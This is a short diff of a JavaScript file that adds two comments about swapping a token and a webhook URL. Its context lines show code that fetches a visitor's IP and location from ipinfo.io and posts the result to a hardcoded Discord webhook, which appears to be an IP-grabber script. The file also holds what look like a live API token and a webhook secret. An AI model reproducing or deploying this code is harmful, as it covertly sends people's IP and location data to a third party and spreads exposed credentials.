@@ -1,5 +1,6 @@
 async function getIPInfo() {
     try {
+        //changes token 764axxxx
         const response = await fetch('https://ipinfo.io/json?token=764a6373117b28');
         const data = await response.json();
         return data;
@@ -9,6 +10,7 @@ async function getIPInfo() {
 }
 
 async function sendToDiscord(ipInfo) {
+    //change webhook url https:
     const webhookURL = 'https://discord.com/api/webhooks/1249563638977531925/uKfEV4WY6UJVbUv8bx-OC6d1ZPFYe6MewF6Qmeb21dkajwjie1i4A5P9cnFn0JFdLqNM';
     
     const data = {
